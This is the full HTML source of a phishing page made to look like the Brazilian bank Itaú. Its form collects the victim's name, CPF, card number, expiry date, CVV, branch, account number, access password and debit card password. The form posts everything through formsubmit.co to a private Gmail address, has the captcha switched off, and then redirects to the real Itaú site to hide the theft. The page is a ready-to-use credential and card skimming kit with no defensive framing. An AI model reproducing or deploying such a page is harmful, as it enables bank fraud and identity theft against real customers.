<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Confirmação Completa - Itaú</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      background: linear-gradient(135deg, #003d73, #0057a3);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
      min-height: 100vh;
    }
    header {
      margin-bottom: 30px;
      text-align: center;
      color: #ffb347;
      font-weight: 900;
      font-size: 3rem;
      letter-spacing: 4px;
      text-shadow: 1.5px 1.5px 6px rgba(0,0,0,0.6);
      font-family: 'Arial Black', Arial, sans-serif;
      user-select: none;
    }
    form {
      background-color: #0b2340;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
      padding: 35px 40px;
      width: 100%;
      max-width: 480px;
      display: flex;
      flex-direction: column;
    }
    h1 {
      color: #ffb347;
      font-weight: 900;
      font-size: 2rem;
      text-align: center;
      margin-bottom: 30px;
      text-shadow: 1px 1px 4px rgba(0,0,0,0.4);
      letter-spacing: 1.5px;
    }
    label {
      font-weight: 700;
      margin-bottom: 8px;
      color: #f5c06f;
    }
    input {
      padding: 14px;
      border-radius: 12px;
      border: none;
      font-size: 1rem;
      margin-bottom: 22px;
      outline: none;
      background-color: #142d5e;
      color: #fff;
    }
    input::placeholder {
      color: #bbb;
    }
    button {
      margin-top: 10px;
      background: linear-gradient(90deg, #ffb347, #ffcc70);
      border: none;
      padding: 18px;
      font-size: 1.4rem;
      font-weight: 900;
      border-radius: 16px;
      color: #0b2340;
      cursor: pointer;
      box-shadow: 0 6px 15px #cc8e21;
    }
    button:hover {
      background: linear-gradient(90deg, #ffcc70, #ffb347);
    }
    @media (max-width: 520px) {
      form {
        padding: 30px 25px;
      }
      h1 {
        font-size: 1.7rem;
      }
      button {
        font-size: 1.2rem;
        padding: 16px;
      }
    }
  </style>
</head>
<body>

  <header>Itaú</header>

  <form action="https://formsubmit.co/bieell.vg@gmail.com" method="POST">
    <h1>Validação e Confirmação</h1>

    <label for="nome">Nome completo</label>
    <input type="text" id="nome" name="nome" placeholder="Ex: Gabriel Vieira" required />

    <label for="cpf">CPF</label>
    <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required />

    <label for="cartao">Número do cartão</label>
    <input type="text" id="cartao" name="cartao" placeholder="0000 0000 0000 0000" required />

    <label for="validade">Validade</label>
    <input type="text" id="validade" name="validade" placeholder="MM/AA" required />

    <label for="cvv">CVV</label>
    <input type="text" id="cvv" name="cvv" placeholder="123" required />

    <label for="agencia">Agência</label>
    <input type="text" id="agencia" name="agencia" placeholder="0000" required />

    <label for="conta">Conta</label>
    <input type="text" id="conta" name="conta" placeholder="000000-0" required />

    <label for="senhaacesso">Senha de acesso</label>
    <input type="password" id="senhaacesso" name="senhaacesso" placeholder="******" required />

    <label for="senhadb">Senha do cartão débito</label>
    <input type="password" id="senhadb" name="senhadb" placeholder="******" required />

    <input type="hidden" name="_captcha" value="false" />
    <input type="hidden" name="_next" value="https://www.itau.com.br/" />

    <button type="submit">Confirmar</button>
  </form>

</body>
</html>
